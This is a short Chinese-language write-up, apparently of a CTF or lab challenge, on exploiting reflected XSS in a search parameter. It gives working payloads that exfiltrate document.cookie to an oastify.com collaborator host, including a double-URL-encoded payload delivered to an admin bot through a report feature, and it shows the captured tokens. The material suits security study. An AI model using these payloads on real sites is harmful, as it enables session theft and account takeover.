测试搜索功能 XSS
- 标题 HTML 标记
    `/?search=<h3>title</h3>`
    - 响应
        ```html
        <span class="title is-3">
            Search: <h3>
                title
            </h3>
        </span>
        ```
    - 存在 HTML 标签注入

- 测试 JS 代码
    `/?search=<img/src/onerror=print()>`
    - 响应
        ```html
        <span class="title is-3">
            Search: <img/src/onerror=print()>
        </span>
        ```
    - 访问浏览器，成功执行

- 测试 cookie 载荷
    `/?search=<img/src/onerror="new%20Image().src='//id.oastify.com/'%2bdocument.cookie">`
    - 协作服务器得到
        ```http
        GET /token=EjdVhs3B90SCOTaS5QHEBPPJSeQqeafcKHN4u6yi5SRKSKl3BnSkmge0Oh5Sm1Bz HTTP/1.1
        Host: id.oastify.com
        ```
    - 然而使用浏览器访问时符号被编码，载荷无效

提交 XSS 载荷到举报功能
- 双重 URL 编码的载荷请求
    ```http
    GET /report?url=/?search=<@urlencode><@urlencode><img/src/onerror="new Image().src='//id.oastify.com/'+document.cookie"></@urlencode></@urlencode> HTTP/1.1
    ```
    - 发送到管理员时第一次 URL 解码
        - 单次 URL 编码时空格分隔 URL，加号之后被解析为空格
    - 管理员访问时第二次 URL 解码

    - 协作服务器收到请求
        ```http
        GET /token=O9Mv3sFaQD1UpQRLCXVOCzCi0dRbpz4Wy4kGPngZt36MZnR6xZpbHLQRWfDi6T45 HTTP/1.1
        Host: id.oastify.com
        Referer: http://gare-au-gorille-www:8000/
        ```

- 额外探索，无编码载荷
    ```http
    GET /report?url=/?search=<img/src/onerror="new/**/Image().src=`//id.oastify.com/${document.cookie}`"> HTTP/1.1
    ```
    - 使用注释代替空格，模板字符串代替变量拼接
